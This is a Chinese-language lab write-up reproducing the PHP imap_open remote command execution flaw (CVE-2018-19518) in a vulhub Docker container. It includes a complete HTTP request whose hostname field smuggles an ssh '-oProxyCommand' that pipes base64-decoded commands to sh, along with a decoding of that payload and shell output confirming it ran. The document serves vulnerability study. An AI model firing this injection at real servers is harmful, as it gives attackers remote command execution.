# PHP imap 远程命令执行漏洞（CVE-2018-19518）复现

---

### 环境创建

> php5.6.38
>
> ubuntu

[vulhub/php/CVE-2018-19518 at master · vulhub/vulhub (github.com)](https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518)

```bash
docker-compose up -d
```

![image-20250202173740809](https://gitee.com/bx33661/image/raw/master/path/image-20250202173740809.png)

这里就用vulhub给的payload了

```http
POST http://43.134.9.57:7000/ HTTP/1.1
Host: 43.134.9.57:7000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
Origin: http://43.134.9.57:7000
Connection: keep-alive
Referer: http://43.134.9.57:7000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222
```

具体分析如下

```
x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh
--->

x -oProxyCommand=echo ZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64 -d|sh
```

--->

`php imap扩展`用于在PHP中执行邮件收发操作。其`imap_open`函数会调用`rsh`来连接远程shell

> `rsh` 通常指 **Remote Shell**（远程 shell），是一种早期的网络协议/工具，用于在远程计算机上执行命令。以下是关键点总结

debian/ubuntu中默认使用ssh来代替rsh的功能

就是说没有经过正确的过滤可以利用ssh中`-oProxyCommand=`来调用命令，实现rce

我们可以回到docker环境检验一下结果

结果如下：
```shell
root@VM-0-9-ubuntu:/home/ubuntu/vulhub-master/php/CVE-2018-19518# docker exec -it vulhub/php:5.6-with-imap /bin/bash
Error response from daemon: No such container: vulhub/php:5.6-with-imap
root@VM-0-9-ubuntu:/home/ubuntu/vulhub-master/php/CVE-2018-19518# docker exec -it 2289e8bd5032 /bin/bash
root@2289e8bd5032:/var/www/html# ls
index.php
root@2289e8bd5032:/var/www/html# cd /tmp
root@2289e8bd5032:/tmp# ls
test0001
root@2289e8bd5032:/tmp# 
```

> 从回显来看，我们没有建立连接，但是结果还是命令执行了

